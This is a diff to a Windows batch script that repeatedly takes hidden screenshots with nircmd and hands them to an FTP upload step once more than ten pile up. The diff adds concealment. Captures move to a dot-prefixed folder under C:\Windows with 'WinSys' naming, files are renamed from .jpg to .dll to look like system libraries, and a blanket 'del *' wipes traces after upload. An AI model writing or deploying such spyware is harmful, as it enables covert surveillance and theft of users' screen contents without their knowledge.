@@ -3,9 +3,9 @@
 set binarypath=C:\Windows\System32\WinSys\binary
 REM do remember to change the ftp config file as well, as it need to access the output data.
 REM lcd should be aligned with the datapath set here
-set datapath=C:\Users\Administrator\WinSys\ftp\cfg
+REM set datapath=C:\Users\Administrator\.WinSys\ftp\.cfg
+set datapath=C:\Windows\.WinSys\.cfg
 set FILE_THRES=10
-
 
 if not exist %datapath% mkdir %datapath%
 
@@ -19,8 +19,8 @@ echo "wait..."
 REM timeout /T 10 /NOBREAK
 ping -n 10 -w 1000 127.0.0.1 >nul
 
-REM C:\Users\Administrator\WinSys\ftp\nircmd-x64\nircmd.exe runinteractivecmd savescreenshot C:\Users\Administrator\WinSys\ftp\cfg\scr~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.png
-start /wait %binarypath%\nircmd-x64\nircmd.exe runinteractivecmd savescreenshot  "scr~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.jpg"
+REM C:\Users\Administrator\WinSys\ftp\nircmd-x64\nircmd.exe runinteractivecmd savescreenshot C:\Users\Administrator\WinSys\ftp\cfg\sys~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.png
+start /wait %binarypath%\nircmd-x64\nircmd.exe runinteractivecmd savescreenshot  "sys~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.jpg"
 
 REM set mmdd=%date:~5,2%%date:~8,2%
 REM set hhmiss=%time:~0,2%%time:~3,2%%time:~6,2%
@@ -29,11 +29,11 @@ REM echo "Next image: %fileprefix%.jpg"
 REM start /wait %binarypath%\nircmd-x64\nircmd.exe runinteractivecmd savescreenshot "%fileprefix%.jpg"
 
 ping -n 2 -w 1000 127.0.0.1 >nul
-ren *.jpg *.dat
+ren *.jpg *.dll
 
 set cnt=0
 for %%A in (*) do set /a cnt+=1
-echo "Totaol file cnt: %cnt%"
+echo "Total file cnt: %cnt%"
 if %cnt% GTR %FILE_THRES% (
 	echo "try upload..."
 	GOTO UPLOAD
@@ -59,9 +59,12 @@ if %cnt% GTR %FILE_THRES% (
 	ping -n 10 -w 1000 127.0.0.1 >nul
 	
 	echo "CLEANUP"
-	del *.jpg
-	del *.png
-	del *.dat
+	REM del *.jpg
+	REM del *.png
+	REM del *.dat
+	REM del *.dll
+	REM del *.tmp
+	del *
 
 GOTO Loop
 
